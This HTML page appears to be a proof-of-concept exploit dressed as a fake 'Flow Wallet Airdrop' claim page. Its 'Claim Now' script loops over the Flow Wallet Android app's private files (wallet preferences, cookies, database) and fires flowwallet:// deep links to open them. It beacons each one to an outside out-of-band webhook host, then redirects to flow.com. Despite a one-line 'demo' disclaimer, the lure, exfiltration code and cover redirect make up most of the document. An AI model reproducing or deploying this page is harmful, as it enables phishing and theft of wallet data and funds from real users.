<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>wallet.flow.com</title>
  <style>
    body {
      margin: 0; padding: 0; height: 100vh; background: linear-gradient(135deg, #0f172a, #1e293b);
      font-family: system-ui, sans-serif; color: #e2e8f0; display: flex; flex-direction: column;
      justify-content: center; align-items: center; text-align: center;
    }
    h1 { font-size: 32px; margin-bottom: 20px; text-shadow: 0 0 20px #22c55e; }
    p { font-size: 18px; color: #94a3b8; margin-bottom: 40px; max-width: 500px; }
    .btn {
      padding: 18px 40px; font-size: 20px; background: #22c55e; color: black; border: none;
      border-radius: 16px; cursor: pointer; box-shadow: 0 10px 40px rgba(34,197,94,0.6);
      transition: 0.3s; font-weight: bold;
    }
    .btn:hover { background: #16a34a; transform: scale(1.05); }
    .warning { margin-top: 40px; font-size: 14px; color: #ef4444; }
  </style>
</head>
<body>

  <h1>Flow Wallet Airdrop!</h1>
  <p>You've been selected for 10,000 FLOW tokens. Click below to claim instantly!</p>
  <button class="btn" onclick="claimAirdrop()">Claim Now</button>

  <p class="warning">This is a demo — do not use on real wallet!</p>

  <script>
    function claimAirdrop() {
      // OOB KAMU
      const OOB = "keen-unicorn-32.webhook.cool";

      // SENSITIVE FILES YANG MAU DI-EXFIL
      const sensitiveFiles = [
        "file:///data/data/onflow.flowwallet/shared_prefs/onboarding.xml",
        "file:///data/data/onflow.flowwallet/shared_prefs/wallet.xml",
        "file:///data/data/onflow.flowwallet/app_webview/Default/Cookies",
        "file:///data/data/onflow.flowwallet/shared_prefs/com.onflow.flowwallet_preferences.xml",
        "file:///data/data/onflow.flowwallet/databases/flowwallet.db"
      ];

      // LOOP SEMUA FILE → TRIGGER FLOW WALLET + EXFIL VIA DNS OOB
      sensitiveFiles.forEach((fileUrl, index) => {
        setTimeout(() => {
          // 1. TRIGGER FLOW WALLET DEEP LINK
          location.href = `flowwallet://dapp?url=${encodeURIComponent(fileUrl)}`;

          // 2. EXFIL VIA DNS OOB (STEALTH!)
          const beaconData = btoa(`file_${index}:${fileUrl}`);
          new Image().src = `https://${beaconData}.${OOB}`;
        }, index * 800); // Delay biar tidak terlalu cepat
      });

      // Optional: redirect ke halaman legit setelah selesai
      setTimeout(() => {
        location.href = "https://flow.com";
      }, sensitiveFiles.length * 800 + 1000);
    }
  </script>

</body>
</html>
